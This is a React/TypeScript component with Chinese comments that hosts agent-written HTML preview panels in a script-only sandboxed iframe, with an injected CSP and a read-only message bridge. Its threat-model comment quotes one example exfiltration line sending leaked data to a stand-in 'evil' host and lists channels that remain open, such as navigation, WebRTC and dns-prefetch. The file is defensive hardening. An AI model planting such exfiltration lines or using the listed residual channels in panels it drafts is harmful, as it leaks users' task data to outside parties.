/**
 * 预览面板 iframe 宿主（issue #328）：把 workspace 的预览面板 bundle
 * （HTML+CSS+JS 单文件）渲染进左栏 content 面板，并提供只读 postMessage 桥。
 *
 * 威胁模型（与 components/artifact/ArtifactRenderedPreview.tsx 的静态产物
 * 预览刻意不同）：
 * - bundle 是 agent 起草、人工发布的**代码**，必须能跑脚本——所以沙箱授
 *   `allow-scripts`；ArtifactRenderedPreview 面对的是纯内容，授空沙箱。
 * - **永不授 `allow-same-origin`**：授了它，allow-scripts 的 bundle 就变成
 *   同源脚本——能携带会话 cookie 调平台全部 API、读宿主 DOM，多用户部署下
 *   等于会话接管。opaque origin 下面板拿不到 cookie/localStorage/宿主 DOM。
 * - **出站网络由 CSP 收紧**（codex P1 + 评审加固）：sandbox 的 allow-scripts
 *   只隔离源与 DOM，不阻 fetch/sendBeacon/<img> 等外联——恶意 bundle 可先
 *   经桥读当前任务数据再发往任意外部地址。宿主用 DOMParser 定位 bundle 的
 *   **真实** <head>（正则定位会被注释/字符串字面量/属性值里的伪 <head> 抢
 *   占——bundle 是攻击者控制的文本），在解析器语义下插入 CSP meta 后重新
 *   序列化。策略：default-src 'none' + script/style 'unsafe-inline'（单文件
 *   bundle 的本体就是 inline 脚本/样式）+ 平台 origin（katex 等构建资产，
 *   font-src 同理）+ img-src data:/平台 origin（#500 P1-4：曾放行任意
 *   `https:` 图源——`new Image().src='https://evil/?d='+leak` 是零门槛 GET
 *   外带通道，与 fetch/sendBeacon 同罪；收紧后图源只剩 data: 内联与平台
 *   origin，两处都是实际引用面：预览 bundle 无外链图（内置面板的消毒器
 *   只产出 https 远程图——收紧后这类图随 CSP 一起失效降级为空，属安全
 *   收敛的预期取舍））+ media-src blob:（#1146：面板经桥 readArtifactBytes
 *   取媒体字节后自建 blob URL 播放——blob 只能由面板本帧脚本创建，字节
 *   全部来自桥，不构成出站面）+ connect-src 限平台 origin。
 *   宿主文档自身的 HTTP 头策略也被 srcdoc 继承：#989 起其 script-src 是
 *   per-response nonce，bundle 的 <script> 由 panelCsp.ts 盖章放行，inline
 *   事件属性（onclick=）被拦截并经 csp-violation 探针提示。
 *   所有 origin 都写注入时的绝对值：opaque origin 下 'self' 不匹配任何
 *   URL（CSP3），写了等于没写。
 * - **已知残留**（meta-CSP 框架内无标准修法）：CSP 不治理 iframe 自导航，
 *   `location.href`/`<meta refresh>` 仍可携带 query 外传；同样不治理
 *   WebRTC（`new RTCPeerConnection` 的 ICE 协商可向任意 STUN 服务器外发
 *   数据）与 `<link rel="dns-prefetch">`/`rel="preconnect"` 的域名探测。
 *   fetch/sendBeacon/img/子资源/表单通道已闭合；导航/WebRTC/dns-prefetch
 *   通道作为接受的残留记录于此（均携带量有限——只能带出脚本已知的数据，
 *   不能读取响应）。
 * - 桥只暴露只读方法（listArtifacts/readArtifact/readArtifactBytes/
 *   getJobDetail，方法体见 bridgeRequestHandler.ts），返回的都是当前页面
 *   用户本来就有权看到的数据（readArtifactBytes 复用 raw 端点的会话鉴权，
 *   512 MiB 内存护栏防大文件整读）；写操作（发布/归档/改配置）不走桥。
 *   init 消息带 capabilities 声明（基础三法之外的增量方法，#1146）——
 *   守卫白名单对未知 method 静默丢弃，面板无法靠探测发现新方法。
 * - 消息鉴别：opaque origin 的 event.origin 恒为 "null"，不能用来鉴权——
 *   宿主钉住 event.source === iframe.contentWindow 再校验 source 标记；
 *   回包 postMessage(..., '*') 的目标窗口由 contentWindow 引用钉死，不会
 *   投递到其他窗口。
 */
import { useEffect, useMemo, useRef, useState } from 'react'
import { useTheme, type Theme } from '@mui/material/styles'
import katexCssUrl from 'katex/dist/katex.min.css?url'
import katexJsUrl from 'katex/dist/katex.min.js?url'
import { useJobDetailQuery } from '../../hooks/useJobDetailQuery'
import {
  isPanelToHostMessage,
  PREVIEW_HOST_CAPABILITIES,
  PREVIEW_HOST_SOURCE,
  type PreviewHostInitMessage,
} from './bridge'
import { handleBridgeRequest } from './bridgeRequestHandler'
import { buildPanelCsp, injectPanelCsp, readDocumentCspNonce } from './panelCsp'
import styles from './PreviewPanelHost.module.css'

const MIN_HEIGHT = 120
const MAX_HEIGHT = 6000
const DEFAULT_HEIGHT = 320

// 面板对所有成员可见，提示面向成员（#989）：说明现象 + 找管理员的两条出路。
const CSP_BLOCKED_HINT =
  '此面板的部分按钮或交互被安全策略拦截，可能无法使用。请联系管理员：' +
  '可让 agent 按最新面板规范（用 addEventListener 绑定事件）重写面板，' +
  '或在「全局设置 → 实例设置 → 安全」中临时开启预览面板兼容模式。'

export interface PreviewPanelHostProps {
  jobId: string
  /** 完整 HTML 文档 bundle（已发布版本或草稿预览）。 */
  html: string
  title?: string
}

/** 桥注入的主题变量：面板 CSS 用 var(--pp-*) 跟随平台观感。 */
function buildThemeVariables(theme: Theme): Record<string, string> {
  return {
    '--pp-bg': theme.palette.background.default,
    '--pp-surface': theme.palette.background.paper,
    '--pp-text': theme.palette.text.primary,
    '--pp-text-secondary': theme.palette.text.secondary,
    '--pp-accent': theme.palette.primary.main,
    '--pp-on-accent': theme.palette.primary.contrastText,
    '--pp-error': theme.palette.error.main,
    '--pp-border': theme.palette.divider,
    '--pp-radius': `${theme.shape.borderRadius * 2}px`,
    '--pp-font-family': theme.typography.fontFamily ?? 'sans-serif',
  }
}

export function PreviewPanelHost({
  jobId,
  html,
  title,
}: PreviewPanelHostProps) {
  const iframeRef = useRef<HTMLIFrameElement>(null)
  const [loading, setLoading] = useState(true)
  const [height, setHeight] = useState<number>(DEFAULT_HEIGHT)
  const theme = useTheme()
  const { data: detail } = useJobDetailQuery(jobId)
  // ready 之后节点状态翻转（产物节点完成）→ 重发 init 触发面板重取数据
  // （替代 #11 时代面板内部的 artifact 重取；bundle 侧约定 init 即重渲染）。
  const readyRef = useRef(false)
  const nodeSignatureRef = useRef<string | null>(null)

  const initMessage = useMemo<PreviewHostInitMessage>(
    () => ({
      source: PREVIEW_HOST_SOURCE,
      type: 'init',
      jobId,
      theme: buildThemeVariables(theme),
      assets: {
        // bundle 可按需懒加载平台构建产物（LaTeX 等）；缺失时必须自行降级。
        katexCssUrl: new URL(katexCssUrl, window.location.origin).href,
        katexJsUrl: new URL(katexJsUrl, window.location.origin).href,
      },
      // 基础三法之外的增量能力（#1146）：面板据此同步分支，旧面板零影响。
      capabilities: PREVIEW_HOST_CAPABILITIES,
    }),
    [jobId, theme]
  )

  // 面板内脚本被宿主严格 CSP 拦截（多为 inline 事件属性，#989）——提示而
  // 非静默失效。
  const [scriptBlocked, setScriptBlocked] = useState(false)

  // CSP 注入 + nonce 盖章随 bundle 变化重算（srcDoc 导航见
  // PreviewPanelSection 的 key）；nonce 每次页面加载固定，见 panelCsp.ts。
  const framedHtml = useMemo(
    () => injectPanelCsp(html, buildPanelCsp(), readDocumentCspNonce()),
    [html]
  )

  useEffect(() => {
    const signature = (detail?.nodes ?? [])
      .map((node) => `${node.node_key}:${node.status}`)
      .join('|')
    if (!readyRef.current) {
      return
    }
    if (
      nodeSignatureRef.current !== null &&
      nodeSignatureRef.current !== signature
    ) {
      iframeRef.current?.contentWindow?.postMessage(initMessage, '*')
    }
    nodeSignatureRef.current = signature
  }, [detail, initMessage])

  useEffect(() => {
    function respond(
      id: number,
      ok: boolean,
      payload?: unknown,
      error?: string
    ) {
      iframeRef.current?.contentWindow?.postMessage(
        {
          source: PREVIEW_HOST_SOURCE,
          type: 'response',
          id,
          ok,
          ...(ok ? { payload } : { error: error ?? 'unknown error' }),
        },
        '*'
      )
    }

    function onMessage(event: MessageEvent) {
      const frame = iframeRef.current
      if (!frame || event.source !== frame.contentWindow) return
      const data: unknown = event.data
      if (!isPanelToHostMessage(data)) return
      if (data.type === 'ready') {
        readyRef.current = true
        nodeSignatureRef.current = (detail?.nodes ?? [])
          .map((node) => `${node.node_key}:${node.status}`)
          .join('|')
        frame.contentWindow?.postMessage(initMessage, '*')
        return
      }
      if (data.type === 'csp-violation') {
        setScriptBlocked(true)
        return
      }
      if (data.type === 'resize') {
        setHeight(
          Math.min(MAX_HEIGHT, Math.max(MIN_HEIGHT, Math.round(data.height)))
        )
        return
      }
      void handleBridgeRequest(
        data.id,
        data.method,
        data.params,
        jobId,
        detail,
        respond
      )
    }

    window.addEventListener('message', onMessage)
    return () => window.removeEventListener('message', onMessage)
  }, [jobId, detail, initMessage])

  return (
    <div className={styles.wrapper} data-testid="preview-panel-host">
      {loading && <div className={styles.loading}>预览加载中…</div>}
      {scriptBlocked && (
        <div className={styles.cspWarning} role="status">
          {CSP_BLOCKED_HINT}
        </div>
      )}
      <iframe
        ref={iframeRef}
        className={styles.frame}
        title={title ?? '自定义预览面板'}
        // 安全红线见文件头注释：allow-scripts 可授，allow-same-origin 永不授；
        // 出站网络由注入的 CSP meta 钉死（见 panelCsp.ts）。
        sandbox="allow-scripts"
        srcDoc={framedHtml}
        style={{ height }}
        onLoad={() => setLoading(false)}
      />
    </div>
  )
}
